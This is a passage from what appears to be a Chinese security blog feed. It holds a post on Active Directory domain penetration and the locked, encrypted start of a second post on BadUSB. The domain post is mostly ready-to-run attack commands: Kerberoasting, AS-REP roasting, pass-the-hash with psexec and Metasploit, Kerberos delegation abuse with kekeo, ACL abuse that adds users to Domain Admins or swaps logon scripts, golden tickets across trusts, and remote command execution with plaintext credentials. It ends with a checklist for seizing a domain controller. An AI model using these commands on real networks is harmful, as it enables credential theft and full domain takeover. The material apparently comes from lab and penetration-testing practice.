pentest.com/administrator:hxc1234567890! -dc-ip 192.168.1.109 -request格式：python GetUserSPNs.py  &lt;domain&gt;/&lt;username&gt;:&lt;password&gt; -dc-ip &lt;target_dc_ip&gt; -request</code></pre><p><img src="https://s1.ax1x.com/2020/04/05/GDnwvt.png" alt=""></p><h2 id="域用户未启用Kerberos预验证"><a href="#域用户未启用Kerberos预验证" class="headerlink" title="域用户未启用Kerberos预验证"></a>域用户未启用Kerberos预验证</h2><p>当用户未启动kerberos验证时，可以通过模拟请求来获取用户的TGT</p><pre><code>Rubeus.exe asreproast /user:gadmin /format:hashcat /outfile:user.txt 用法：Rubeus.exeasreproast /user:&lt;域用户&gt; /format:hashcat /outfile:&lt;输出文件地址&gt;python3 GetNPUsers.py pentest/ -usersfile /root/Desktop/user.txt -format john -outputfile /root/Desktop/out.txt -dc-ip 192.168.1.107 #用法：python3 GetNPUsers.py &lt;域前缀&gt;/ -userfile &lt;用户字典路径&gt; -format john -outfile &lt;输出文件路径&gt;GetNPusers.py单个用户测试：python GetNPUsers.py htb.local/svc-alfresco -no-pass</code></pre><p><img src="https://s1.ax1x.com/2020/04/05/GDnR8s.png" alt=""><br>除了使用Rubeues的方法就是用impacket工具包里GetNPusers.py<br><img src="https://s1.ax1x.com/2020/04/05/GDn7aF.png" alt=""></p><h2 id="hash传递攻击"><a href="#hash传递攻击" class="headerlink" title="hash传递攻击"></a>hash传递攻击</h2><p>条件：</p><ul><li>知道nt lm hash</li></ul><pre><code>msf module:use exploit/windows/smb/psexecset RHOST 10.2.0.3set SMBUser jarrietaset SMBPass nastyCutt3r  # NOTE1: The password can be replaced by a hash to execute a `pass the hash` attack.# NOTE2: Require the full NTLM hash, you may need to add the &quot;blank&quot; LM (aad3b435b51404eeaad3b435b51404ee)set PAYLOAD windows/meterpreter/bind_tcprunshellimpacket/psexec:python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:d31e374dd553580d243d2df0cc5f0503 ./gadmin@pentest.com &quot;whoami&quot; #执行命令python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:d31e374dd553580d243d2df0cc5f0503 ./gadmin@pentest.com #反弹shellproxychains python ./psexec.py jarrieta@10.2.0.2 -hashes :489a04c09a5debbc9b975356693e179d 使用wmiexec.vbs也行</code></pre><p><img src="https://s1.ax1x.com/2020/04/05/GDnO2R.png" alt=""></p><h2 id="AdminSDHolder滥用"><a href="#AdminSDHolder滥用" class="headerlink" title="AdminSDHolder滥用"></a>AdminSDHolder滥用</h2><p>介绍：AdminSDHolder是一个特殊的AD容器，具有一些默认安全权限，用作受保护的AD账户和组的模板。<br>AdminSDHolder所有权限的默认所有者只有：Domain Admins、Enterprise Admins、Administrators。这三个组有所有权限，当普通域用户有所有权限的话<br>可以控制整个域<br>参考链接： <a href="https://xz.aliyun.com/t/7276" target="_blank" rel="noopener">https://xz.aliyun.com/t/7276</a><br><img src="https://s1.ax1x.com/2020/04/05/GDuVMt.png" alt=""></p><h2 id="kerberos委派攻击"><a href="#kerberos委派攻击" class="headerlink" title="kerberos委派攻击"></a>kerberos委派攻击</h2><p>在域中如果出现A使用Kerberos身份验证访问域中的服务B，而B再利用A的身份去请求域中的服务C，这个过程就可以理解为委派</p><blockquote><p>User访问主机s2上的HTTP服务，而HTTP服务需要请求其他主机的SQLServer数据库，但是S2并不知道User是否有权限访问SQLServer，这时HTTP服务会利用User的身份去访问SQLServer，如果User有权限访问SQLServer服务才能访问成功。</p></blockquote><p>委派分为两种：</p><ul><li>非约束委派</li><li>约束委派</li></ul><p>windows server 2012 或以上的：资源委派</p><p>参考链接：<a href="http://redteam.today/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/" target="_blank" rel="noopener">用域委派打烂kerberos狗头 | 李三的剑谱</a></p><p>由于无约束委派攻击之前已经做过，不在重复叙述：<a href="https://422926799.github.io/posts/4d3be28.html" target="_blank" rel="noopener">Kerberos委派攻击 | 九世的博客</a></p><p>约束委派利用：<br>约束委派，将一个服务账户委派给一个指定的服务<br><img src="https://s1.ax1x.com/2020/04/05/GDMkut.png" alt=""></p><p>利用委派约束的条件：</p><ul><li>知道被委派的用户NT LM HASH</li></ul><p>建议在这种时候使用：<br><img src="https://s1.ax1x.com/2020/04/05/GDMd29.png" alt=""></p><p>使用过程：<br>先用mimikatz获取hash，然后用kekeo请求域控获取凭证</p><pre><code>tgt::ask /user:gadmin /domain:pentest.com /ntlm:d31e374dd553580d243d2df0cc5f0503</code></pre><p><img src="https://s1.ax1x.com/2020/04/05/GDMDDx.png" alt=""></p><p>然后利用TGT请求对应委派的服务，成功后会返回域管理的TGT</p><pre><code>tgs::s4u /tgt:TGT_gadmin@PENTEST.COM_krbtgt~pentest.com@PENTEST.COM.kirbi /user:Administrator@pentest.com /service:cifs/WIN-YZAQ01YWQBO.pentest.com </code></pre><p><img src="https://s1.ax1x.com/2020/04/05/GDMR8H.png" alt=""></p><p>导入凭证<br><img src="https://s1.ax1x.com/2020/04/05/GDM7a8.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/04/05/GDMqPg.png" alt=""></p><p>成功的话可以访问域控cifs（共享文件服务）<br><img src="https://s1.ax1x.com/2020/04/05/GDQFG4.png" alt=""></p><p>可以利用IPC$把域控秒了</p><h2 id="ACL提权"><a href="#ACL提权" class="headerlink" title="ACL提权"></a>ACL提权</h2><p>ACL理解：<br>参考链接： <a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B8%8B%E7%9A%84Access-Control-List/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B8%8B%E7%9A%84Access-Control-List/</a> （后门手法非常好）</p><p>ACL提权例子：<br><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E4%BD%BF%E7%94%A8Exchange%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%89%B9%E5%AE%9A%E7%9A%84ACL%E5%AE%9E%E7%8E%B0%E5%9F%9F%E6%8F%90%E6%9D%83/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E4%BD%BF%E7%94%A8Exchange%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%89%B9%E5%AE%9A%E7%9A%84ACL%E5%AE%9E%E7%8E%B0%E5%9F%9F%E6%8F%90%E6%9D%83/</a></p><p>常见的ACL</p><ul><li>GenericAll on User： 我们可以在不知道当前密码的情况下重置用户的密码</li><li>GenericAll on Group： 实际上，这允许我们将自己(用户无斑点)添加到域管理组（ net group “domain admins” spotless /add /domain）</li><li>WriteProperty on Group： 我们可以再次将自己添加到域管理员组并升级权限（net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName “domain admins” -Domain “offense.local”; net user spotless /domain）</li><li>Self (Self-Membership) on Group： 另一个允许攻击者将自己添加到组的特权</li><li>ForceChangePassword： 我们可以在不知道用户当前密码的情况下重置用户的密码（ $c = Get-Credential;Set-DomainUserPassword -Identity changeme -AccountPassword $c.Password -Verbose）</li><li>GenericWrite on User：ObjectType上的WriteProperty(在本例中是脚本路径)允许攻击者覆盖委托用户的登录脚本路径，这意味着下一次当用户委托登录时，他们的系统将执行我们的恶意脚本（Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue “\10.0.0.5\totallyLegitScript.ps1）</li><li>WriteDACL： 通过应用以下扩展权限，可以将任何给定帐户添加为域的复制伙伴，包括“复制目录更改/全部复制目录更改”。 Invoke-ACLPwn是一种工具，可以自动在Active Directory中发现和配置不安全的ACL，并对其进行伪造（ ./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username ‘testuser’ -Domain ‘xenoflux.local’ -Password ‘Welcome01!’）</li></ul><p>acl检查（检测用户组的ACL），项目： <a href="https://github.com/canix1/ADACLScanner" target="_blank" rel="noopener">https://github.com/canix1/ADACLScanner</a></p><pre><code>PS C:\Users\gadmin\Desktop\ADACLScanner-master\ADACLScanner-master&gt; .\ADACLScan.ps1 -Base &quot;dc=pentest,dc=com&quot; -Filter &quot;(&amp;(AdminCount=1))&quot; -Scope subtree -EffectiveRightsPrincipal gadmin -Output HTML -Show                                    用法：.\ADACLScan.ps1 -Base &quot;dc=&lt;domain&gt;,dc=&lt;domain&gt; -Filter &quot;(&amp;(AdminCount=1))&quot; -Scope subtree -EffectiveRightsPrincipal &lt;username&gt; -Output HTML -Show         </code></pre><p><img src="https://s1.ax1x.com/2020/04/05/GDQqw6.png" alt=""></p><h2 id="域信任利用"><a href="#域信任利用" class="headerlink" title="域信任利用"></a>域信任利用</h2><p>前提条件：需要对当前域的域管理员级别访问权限。</p><p>通过获取当前krbtgt的hash，并创建金票攻击另外一个域</p><pre><code>kerberos::golden /user:Administrator /krbtgt:HASH_KRBTGT /domain:domain.local /sid:S-1-5-21-2941561648-383941485-1389968811 /sids:S-1-5-SID-SECOND-DOMAIN-519 /ptt</code></pre><h2 id="Azure-Admins域数据泄露"><a href="#Azure-Admins域数据泄露" class="headerlink" title="Azure Admins域数据泄露"></a>Azure Admins域数据泄露</h2><p>参考文章：<a href="https://blog.xpnsec.com/azuread-connect-for-redteam/?fbclid=IwAR2wmrSzPTltpwFr692ktPkNCQUWJVOVz_veohaEtefxbG_MaN57xBTSUSI" target="_blank" rel="noopener">XPN InfoSec Blog</a></p><p>貌似就是从SQL Server里查询对应的数据<br><img src="https://s2.ax1x.com/2020/01/25/1eOTxg.md.png" alt=""></p><p>利用条件：</p><ul><li>当前用户是Azure Admins组</li></ul><p><img src="https://s1.ax1x.com/2020/04/05/GDlH3Q.png" alt=""></p><p>直接执行命令</p><pre><code>$pass = cOnvertTo-SecureString &#39;d0m@in4dminyeah!&#39; -AsPlainText -Force$cred = New-Object System.Management.Automation.PSCredential (&quot;administrator&quot;,$pass)Invoke-command -Computer MONTEVERDE -ScriptBlock { type C:\users\administrator\desktop\root.txt } -Credential $cred</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>拿到域内主机权限后，先进行敏感文件搜寻，hash导出。密码获取，查看域管，域用户有哪些，常规的信息收集<ul><li>获取当前域的基本信息，是否有登录什么域。主域控是那台</li><li>搜寻SPN用户</li><li>内网存活探测</li><li>尝试利用获取到的hash或密码进行psexec或者wmi上线</li><li>搜寻smb里的xml文件，有cpassword的关键词</li><li>尝试使用MS14-068搞域控</li><li>Kerberos委派攻击</li><li>收集域用户，尝试枚举未启用Kerberos预验证的用户获取TGT</li><li>密码喷洒攻击</li><li>当获取到用户是管理员、域管理员或企业管理员的任何成员以及域控制器计算机帐户都可以运行DCSync来提取密码数据</li><li>使用知名的CVE来进行秒域控</li><li>Azure Admins组MSSQL数据泄露检测（可获取域控administrator的账户凭证）</li><li>实在不行，hash钓鱼走一波</li><li>GPO攻击</li><li>某些ALC用户组提权</li><li>当前用户属于某个Admin组，使用Dsync导出hash</li><li>黄金票据、白银票据</li><li>AdminSDHolder滥用</li><li>ntdsutil可被访问，ntdsutil hash导出</li></ul></li></ul>]]></content>
      
      
        <tags>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>badusb初探</title>
      <link href="/posts/caaa0727.html"/>
      <url>/posts/caaa0727.html</url>
      <content type="html"><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Please enter the password to read the blog." />    <label for="pass">Please enter the password to read the blog.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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